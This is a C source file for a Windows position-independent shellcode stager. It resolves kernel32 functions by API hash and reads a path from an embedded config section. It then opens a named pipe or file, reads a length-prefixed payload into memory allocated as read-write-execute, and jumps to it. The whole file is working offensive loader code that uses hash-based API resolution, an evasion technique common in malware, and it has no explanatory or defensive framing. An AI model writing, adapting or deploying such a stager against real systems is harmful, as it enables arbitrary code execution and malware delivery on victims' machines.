/*
 * stager_pipe payload for Windows — open a named pipe / file path
 * via CreateFileA, read a length-prefixed payload, allocate RWX,
 * copy, and jump.
 *
 * Config layout (matches unix stager_pipe):
 *   +0x00: path_len (u16, little-endian)
 *   +0x02: path (path_len bytes; we copy to a NUL-terminated local)
 *
 * Wire protocol on the pipe:
 *   +0x00: payload_size (u32, little-endian)
 *   +0x04: payload_data
 */

#include "picblobs/os/windows.h"
#include "picblobs/reloc.h"
#include "picblobs/section.h"
#include "picblobs/types.h"
#include "picblobs/win/resolve.h"

#define HASH_KERNEL32_DLL 0x7040EE75
#define HASH_CREATE_FILE_A 0xEB96C5FA
#define HASH_READ_FILE 0x71019921
#define HASH_CLOSE_HANDLE 0x3870CA07
#define HASH_VIRTUAL_ALLOC 0x382C0F97
#define HASH_EXIT_PROCESS 0xB769339E

#define GENERIC_READ 0x80000000u
#define OPEN_EXISTING 3u
#define MEM_COMMIT 0x1000
#define MEM_RESERVE 0x2000
#define PAGE_EXECUTE_READWRITE 0x40

#define PATH_MAX_LEN 256

typedef void *(PIC_WINAPI *fn_CreateFileA)(const char *lpFileName,
	unsigned long dwDesiredAccess, unsigned long dwShareMode, void *sa,
	unsigned long dwCreationDisposition, unsigned long dwFlagsAndAttributes,
	void *hTemplateFile);
typedef int(PIC_WINAPI *fn_ReadFile)(void *hFile, void *lpBuffer,
	unsigned long nNumberOfBytesToRead, unsigned long *lpNumberOfBytesRead,
	void *lpOverlapped);
typedef int(PIC_WINAPI *fn_CloseHandle)(void *hObject);
typedef void *(PIC_WINAPI *fn_VirtualAlloc)(void *lpAddress, pic_uintptr dwSize,
	unsigned long flAllocationType, unsigned long flProtect);
typedef void(PIC_WINAPI *fn_ExitProcess)(unsigned int uExitCode);

struct resolved_funcs {
	fn_CreateFileA create_file;
	fn_ReadFile read_file;
	fn_CloseHandle close_handle;
	fn_VirtualAlloc virtual_alloc;
	fn_ExitProcess exit_process;
};

PIC_TEXT
__attribute__((noreturn)) static void fail_fast(void) { __builtin_trap(); }

PIC_TEXT
__attribute__((noreturn)) static void exit_process(
	fn_ExitProcess pExitProcess, unsigned int uExitCode)
{
	pExitProcess(uExitCode);
	fail_fast();
}

__asm__(".section .config,\"aw\"\n"
	".globl stager_pipe_windows_config\n"
	"stager_pipe_windows_config:\n"
	".space 2\n"
	".previous\n");

PIC_TEXT
static int read_all(fn_ReadFile rf, void *h, void *buf, pic_u32 count)
{
	pic_u8 *p = (pic_u8 *)buf;
	unsigned long got = 0;
	pic_u32 done = 0;
	while (done < count) {
		if (!rf(h, p + done, count - done, &got, PIC_NULL)) {
			return 0;
		}
		if (got == 0) {
			return 0;
		}
		done += (pic_u32)got;
	}
	return 1;
}

PIC_TEXT
static void resolve_funcs(struct resolved_funcs *funcs)
{
	PIC_SELF_RELOCATE();

	funcs->create_file = (fn_CreateFileA)pic_resolve(
		HASH_KERNEL32_DLL, HASH_CREATE_FILE_A);
	funcs->read_file =
		(fn_ReadFile)pic_resolve(HASH_KERNEL32_DLL, HASH_READ_FILE);
	funcs->close_handle = (fn_CloseHandle)pic_resolve(
		HASH_KERNEL32_DLL, HASH_CLOSE_HANDLE);
	funcs->virtual_alloc = (fn_VirtualAlloc)pic_resolve(
		HASH_KERNEL32_DLL, HASH_VIRTUAL_ALLOC);
	funcs->exit_process = (fn_ExitProcess)pic_resolve(
		HASH_KERNEL32_DLL, HASH_EXIT_PROCESS);
}

PIC_TEXT
static pic_u16 load_path(char *path)
{
	extern char stager_pipe_windows_config[]
		__attribute__((visibility("hidden")));
	const pic_u8 *cfg = (const pic_u8 *)stager_pipe_windows_config;

	pic_u16 path_len = (pic_u16)cfg[0] | ((pic_u16)cfg[1] << 8);
	if ((0U == path_len) || (PATH_MAX_LEN <= path_len)) {
		return 0;
	}
	for (pic_u16 i = 0; i < path_len; i++) {
		path[i] = (char)cfg[2 + i];
	}
	path[path_len] = '\0';
	return path_len;
}

PIC_TEXT
static void *open_input(const struct resolved_funcs *funcs, const char *path)
{
	return funcs->create_file(
		path, GENERIC_READ, 0, PIC_NULL, OPEN_EXISTING, 0, PIC_NULL);
}

PIC_TEXT
static pic_u32 read_payload_size(const struct resolved_funcs *funcs, void *h)
{
	pic_u8 size_buf[4];
	if (!read_all(funcs->read_file, h, size_buf, 4)) {
		return 0;
	}
	return (pic_u32)size_buf[0] | ((pic_u32)size_buf[1] << 8) |
		((pic_u32)size_buf[2] << 16) | ((pic_u32)size_buf[3] << 24);
}

PIC_TEXT
static void *alloc_payload(const struct resolved_funcs *funcs, pic_u32 size)
{
	return funcs->virtual_alloc(PIC_NULL, (pic_uintptr)size,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
}

PIC_TEXT
static void *load_payload(const struct resolved_funcs *funcs, const char *path)
{
	void *h = 0;
	pic_u32 size = 0;
	void *mem = 0;

	h = open_input(funcs, path);
	if (h == (void *)-1) {
		return PIC_NULL;
	}

	size = read_payload_size(funcs, h);
	if (size == 0 || size > 0x10000000) {
		funcs->close_handle(h);
		return PIC_NULL;
	}

	mem = alloc_payload(funcs, size);
	if (!mem) {
		funcs->close_handle(h);
		return PIC_NULL;
	}

	if (!read_all(funcs->read_file, h, mem, size)) {
		funcs->close_handle(h);
		return PIC_NULL;
	}
	funcs->close_handle(h);
	return mem;
}

PIC_ENTRY
void _start(void)
{
	struct resolved_funcs funcs;
	char path[PATH_MAX_LEN];
	pic_u16 path_len = 0;
	void *mem = 0;

	resolve_funcs(&funcs);
	if (!funcs.create_file || !funcs.read_file || !funcs.close_handle ||
		!funcs.virtual_alloc || !funcs.exit_process) {
		fail_fast();
	}

	path_len = load_path(path);
	if (path_len == 0 || path_len >= PATH_MAX_LEN) {
		exit_process(funcs.exit_process, 1);
	}

	mem = load_payload(&funcs, path);
	if (!mem) {
		exit_process(funcs.exit_process, 1);
	}

	((void (*)(void))mem)();
	exit_process(funcs.exit_process, 0);
}
